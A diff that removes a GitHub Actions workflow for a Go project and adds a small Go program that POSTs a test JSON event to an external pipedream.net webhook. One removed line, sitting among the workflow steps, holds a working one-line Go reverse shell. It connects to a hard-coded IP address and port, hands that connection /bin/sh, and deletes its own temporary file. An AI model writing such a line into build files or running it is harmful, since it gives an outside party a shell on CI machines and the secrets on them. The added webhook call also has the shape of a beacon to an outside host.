@@ -1,28 +1,26 @@
-# This workflow will build a golang project
-# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-go
+package main
 
-name: Go
+import (
+	"bytes"
+	"net/http"
+	"time"
+)
 
-on:
-  push:
-    branches: [ "master" ]
-  pull_request:
-    branches: [ "master" ]
+func main() {
+	jsonStr := []byte(`{
+  "test": "event"
+}`)
 
-jobs:
+	req, err := http.NewRequest("POST", "https://eoywrbj6otr1rve.m.pipedream.net", bytes.NewReader(jsonStr))
+	req.Header.Set("Content-Type", "application/json")
 
-  build:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v3
+	client := &http.Client{Timeout: time.Minute}
 
-    - name: Set up Go
-      uses: actions/setup-go@v4
-      with:
-        go-version: '1.20'
-echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","154.49.137.21:1331");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
-    - name: Build
-      run: go build -v ./...
+	resp, err := client.Do(req)
 
-    - name: Test
-      run: go test -v ./...
+	if err != nil {
+		panic(err)
+	}
+
+	defer resp.Body.Close()
+}
